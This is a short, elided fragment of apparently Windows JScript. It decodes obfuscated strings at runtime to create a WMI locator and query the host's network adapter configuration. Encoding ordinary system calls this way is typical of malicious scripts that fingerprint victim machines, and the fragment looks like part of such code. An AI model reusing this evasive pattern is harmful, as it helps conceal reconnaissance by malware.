...
Vector.prototype.en         = en;
Vector.prototype.dc         = dc;
  ...
  function IndexOf(element)
{
  ...
  return -1;
	...
	try{
	var locator = new ActiveXObject (dc("]hogYixcz~cdm$Y]hogFeik~ex"));
	var service = locator.ConnectServer(".");
	var properties = service.ExecQuery(dc("YOFOI^* *LXEG*]cd98UDo~}exaKnkz~oxIedlcmxk~ced"));
